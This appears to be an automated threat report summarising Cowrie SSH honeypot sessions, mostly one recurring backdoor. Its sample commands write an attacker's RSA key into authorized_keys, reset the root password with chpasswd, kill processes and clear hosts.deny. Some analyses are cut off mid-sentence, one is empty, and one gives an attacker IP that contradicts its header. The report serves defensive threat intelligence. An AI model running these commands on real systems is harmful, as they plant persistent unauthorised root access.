cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NYLVN
tftp; wget; /bin/busybox NYLVN
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
... (+5 more)
```

---

### Pattern: a37498380e58...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 178.217.173.50

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote shell access to the target system.  

**Techniques & Tools Used:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `chmod`) to secure and hide the key file.  
- Injection of a hard‑coded RSA public key into `authorized_keys`.  
- System information gathering (CPU, memory, disk usage) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **178.217.173.50** (Kyrgyzstan).  
- Hard‑coded RSA public key string in the command:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  

**Threat Level:** **High** – the attacker has successfully installed a backdoor, enabling remote control and potential exploitation.  

**Brief Summary:** The attacker injected a malicious SSH key into the target’s `.ssh` directory, securing it with file attributes and permissions, thereby establishing persistent remote access while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:o7ExU7sIOJc1"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 8b5083b55294...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (remote access via SSH)

**2. Objective:**  
Gain privileged remote access on the honeypot by creating an authorized SSH key and resetting the root password to a known value.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo ... > .ssh/authorized_keys` with a hard‑coded RSA public key.
- **Root Password Reset:** `echo "root:Txxg1qTLwbd4"|chpasswd|bash`.
- **Permission Manipulation:** `chmod -R go= ~/.ssh`, `lockr -ia .ssh`.
- **Process Termination & Host Deny Modification:** `pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep`.
- **System Information Gathering:** CPU, memory, filesystem, OS details (e.g., `cat /proc/cpuinfo`, `free -m`, `uname -a`).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **34.142.110.144**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File/Directory: `.ssh/authorized_keys`, `/etc/hosts.deny`

**5. Threat Level:** **High** – root access and persistent backdoor installation.

**6. Brief Summary:**  
The attacker injected a hard‑coded SSH key into the honeypot’s `~/.ssh/authorized_keys` and reset the root password, establishing privileged remote access for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Txxg1qTLwbd4"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 2bc573ea990c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 112.216.120.67

#### Analysis



#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345678\nOVkUIKB9HIPA\nOVkUIKB9HIPA"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345678\nOVkUIKB9HIPA\nOVkUIKB9HIPA\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 26419656cd6b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 199.195.253.95

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access via SSH (root login).  
**Techniques:**  
- SSH key injection (`echo ... > ~/.ssh/authorized_keys`)  
- Root password change (`chpasswd` with `root:NHsdVIcmAdta`)  
- Process termination (`pkill -9 …`) to hide activity.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **199.195.253.95**  
- SSH public key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password hash: `NHsdVIcmAdta` (plain text).  

**Threat Level:** **High** – attacker has full root access and can persistently compromise the system.  

**Brief Summary:** The attacker injected an SSH key and changed the root password to establish a backdoor, enabling remote control of the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:NHsdVIcmAdta"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: bf974787940a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 178.217.173.50

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection & root‑password manipulation (reconnaissance).

**Objective:**  
Gain privileged access (root) on the host by installing a rogue SSH key and altering the root password, then gather system information to assess the environment for further exploitation.

**Techniques Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` with a custom RSA key.
- **Root Password Change** – `chpasswd` command to set a new root password.
- **Process & File Manipulation** – removal of temporary scripts, killing processes (`pkill -9`), and denying hosts (`echo > /etc/hosts.deny`).
- **System Reconnaissance** – CPU info queries, memory usage, uptime (`top`, `w`), system architecture (`uname`, `lscpu`), disk space (`df`).

**Indicators of Compromise (IOCs):**
- IP: **178.217.173.50**  
- SSH Key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrb

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:xamKWKtn7hx0"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ac10690069fe...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.28.57.98

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) – likely a botnet recruitment or remote‑access attempt.  
**Objective:** Gain persistent remote access by adding an SSH public key to the honeypot’s `authorized_keys` and protecting it from deletion.  
**Techniques:**  
- `chattr -ia .ssh; lockr -ia .ssh` – set immutable/locked attributes to prevent removal.  
- Creation of `.ssh`, insertion of a public key via `echo … > .ssh/authorized_keys`.  
- Password manipulation attempts (`passwd` with echoed input).  
- System‑information gathering (CPU, memory, file system, crontab, uname, whoami).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.28.57.98**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Commands that manipulate file attributes (`chattr`, `lockr`).  

**Threat Level:** **Medium‑High** – the attacker demonstrates

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nQ7cBwN0XQd91\nQ7cBwN0XQd91"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nQ7cBwN0XQd91\nQ7cBwN0XQd91\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 6b3d947cda5e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.218.240.181

#### Analysis

**Attack Type:** Backdoor installation / Remote access  
**Objective:** Gain persistent SSH‑root access on the target machine.  
**Techniques:**  
- Injected a custom SSH public key into `~/.ssh/authorized_keys` and made it immutable (`chattr -ia`, `lockr`).  
- Changed root password via `chpasswd`.  
- Gathered system information (CPU, memory, disk) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.218.240.181** (Hong Kong).  
- SSH key string: `ssh-r

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:6hxuDhNT08tg"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e8e990787e5a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.160.247

#### Analysis

**Attack Type:**  
Backdoor installation / botnet recruitment

**Objective:**  
Gain persistent remote SSH access and elevate privileges (root) on the target system for later exploitation or command execution.

**Techniques & Tools Used:**
- **SSH key injection** – created a new `.ssh/authorized_keys` file with a random RSA key.
- **Password reset** – used `chpasswd` to set root password (`dcGc0x79l3KS`).
- **File and process manipulation** – removed temporary scripts, killed processes (`secure.sh`, `auth.sh`, `sleep`), and altered `/etc/hosts.deny`.
- **Reconnaissance** – executed various system‑info commands (CPU, memory, disk usage, uptime, etc.) to gather host details.

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.47.160.247**  
- RSA key string in `authorized_keys` (e.g., “ssh-rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- Root password hash or plaintext (`dcGc0x79l3KS`)  
- Modified files: `.ssh/authorized_keys`, `/etc/hosts.deny`

**Threat Level:** Medium–High (due to root access and persistent backdoor)

**Brief Summary:**  
The attacker injected an SSH key, reset the root password, and removed temporary scripts, establishing a persistent backdoor for future remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:dcGc0x79l3KS"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+8 more)
```

---

### Pattern: 80c714e531c7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection and root credential compromise  
**Objective:** Gain persistent remote access by adding a new SSH key and resetting the root password, then disabling local authentication mechanisms (e.g., `/etc/hosts.deny`).  
**Techniques & Tools:**  
- `chattr`, `lockr` to set immutable attributes on `.ssh` directory.  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `echo "root:T1Rrp8hAFoSX"|chpasswd|bash` to set root password.  
- Process termination (`pkill -9`) and removal of temporary scripts.  
- Denial of hosts via `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **34.142.110.144** (United Kingdom).  
- RSA public key string in `.ssh/authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- File names: `.ssh/authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – the attacker has established a persistent backdoor, altered root credentials, and disabled local authentication.  

**Brief Summary:** The session shows an attacker installing a permanent SSH key and resetting the root password to gain remote control, while disabling local host restrictions, indicating a high‑severity backdoor attack.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:T1Rrp8hAFoSX"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4199bc2635fa...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**1. Attack Type**  
Backdoor installation via SSH key injection + system reconnaissance  

**2. Objective**  
Gain remote SSH access to the host and gather detailed system information for future exploitation or monitoring.  

**3. Techniques**  
- Creation of a new `.ssh` directory, removal of existing keys, and insertion of a custom RSA public key into `authorized_keys`.  
- Setting restrictive permissions (`chmod -R go= ~/.ssh`).  
- Use of `passwd` with echo‑pipe to attempt password changes (likely testing or creating a local account).  
- Collection of CPU, memory, filesystem, and user information via commands such as `cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, `whoami`, etc.  

**4. Indicators of Compromise (IOCs)**  
- Attacker IP: **34.142.110.144**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File: `.ssh/authorized_keys`  

**5. Threat Level**  
Medium – the attacker successfully installed a backdoor and performed reconnaissance, but no evidence of further exploitation or malicious payloads

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nRp6Xyk4yoH29\nRp6Xyk4yoH29"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nRp6Xyk4yoH29\nRp6Xyk4yoH29\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 013f28159da8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.201.208

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (potential botnet recruitment).

**Objective:**  
Gain remote SSH access to the honeypot system and gather hardware information for further exploitation.

**Techniques Used:**  
- File manipulation (`rm -rf .ssh`, `mkdir .ssh`)  
- Immutable attribute setting (`chattr -ia .ssh` / `lockr -ia .ssh`)  
- Permission tightening (`chmod -R go= ~/.ssh`)  
- SSH key injection via `echo` into `authorized_keys`  
- CPU reconnaissance (`cat /proc/cpuinfo | grep name | wc -l`).

**Indicators of Compromise (IOCs):**  
- Attacker IP: **14.103.202.69**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
```

---

### Pattern: d198e59e3258...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.160.247

#### Analysis

**Attack Type:** Backdoor installation with system reconnaissance  
**Objective:** Gain remote SSH access to the machine and gather basic system information (CPU, OS, disk usage).  
**Techniques:**  
- **SSH key injection** – `echo … > .ssh/authorized_keys` and permission changes (`chmod -R go= ~/.ssh`).  
- **File attribute manipulation** – `chattr -ia .ssh`, `lockr -ia .ssh` to hide or lock the SSH directory.  
- **System info gathering** – `cat /proc/cpuinfo | grep name | wc -l`, `uname`, `uname -a`, `whoami`, `lscpu | grep Model`, `df -h`.  
- **Password manipulation attempt** – repeated use of `passwd` with echoed passwords (likely a failed or malicious attempt).  

**Indicators of Compromise (IOCs):**  
- IP: 101.47.160.247 (Singapore)  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
-

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nbo31nHvlXOyE\nbo31nHvlXOyE"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nbo31nHvlXOyE\nbo31nHvlXOyE\n"|passwd
uname
uname -a
... (+3 more)
```

---

### Pattern: 4aacfbfc13e6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**Attack Type:**  
Reconnaissance & SSH credential injection (attempted backdoor installation)

**Objective:**  
The attacker sought to gather system information and inject a new SSH public‑key into the honeypot’s `authorized_keys` file, potentially enabling future access.

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`)
- Creation of an RSA key in `authorized_keys`
- Setting restrictive permissions on `.ssh`
- System‑info gathering commands (CPU, memory, uname, lscpu, etc.)
- Password change attempts via `passwd`

**Indicators of Compromise (IOCs):**
- Attacker IP: **34.142.110.144**  
- RSA public key string in the command (e.g., `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQ..."`)  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium – moderate sophistication with potential for future unauthorized access if the key is valid.

**Brief Summary:**  
The attacker performed reconnaissance on a Cowrie SSH honeypot and attempted to inject an RSA public‑key into the `authorized_keys` file, possibly preparing for later exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345678\n4aJr6L2YgzGw\n4aJr6L2YgzGw"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345678\n4aJr6L2YgzGw\n4aJr6L2YgzGw\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: d7931be56ea0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.28.57.98

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access by adding an SSH public key to the victim’s `authorized_keys` file, then lock the `.ssh` directory to prevent tampering.  
**Techniques:**  
- `chattr -ia .ssh`, `lockr -ia .ssh` – set immutable attributes on the SSH directory.  
- Echo‑pipe to `passwd` – attempt to change or create a new user password.  
- Injection of a hard‑coded RSA public key into `authorized_keys`.  
- System‑info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.28.57.98** (Indonesia)  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345678\no7ExU7sIOJc1\no7ExU7sIOJc1"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345678\no7ExU7sIOJc1\no7ExU7sIOJc1\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 0f3a80d62ea9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection and credential compromise (remote access takeover)

**Objective:**  
Gain unrestricted remote access to the system as root by installing a malicious SSH key and resetting the root password.

**Techniques & Tools Used:**
- `chattr`, `lockr` – modify file attributes to prevent tampering
- `chmod -R go= ~/.ssh` – restrict permissions on `.ssh`
- `echo ... > .ssh/authorized_keys` – inject a public SSH key
- `chpasswd | bash` – change root password
- Process killing (`pkill -9`) and host denial edits to hide activity

**Indicators of Compromise (IOCs):**
- Attacker IP: **34.142.110.144**  
- SSH Public Key (hashable string): `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: **AlPIGmUrEKfD**

**Threat Level:** High – the attacker has full root access and can execute arbitrary commands, potentially compromising data or launching further attacks.

**Brief Summary:**  
The attacker injected a malicious SSH key into the system’s authorized_keys file and reset the root password to gain complete remote control of the honeypot.

#### Sample Commands
```
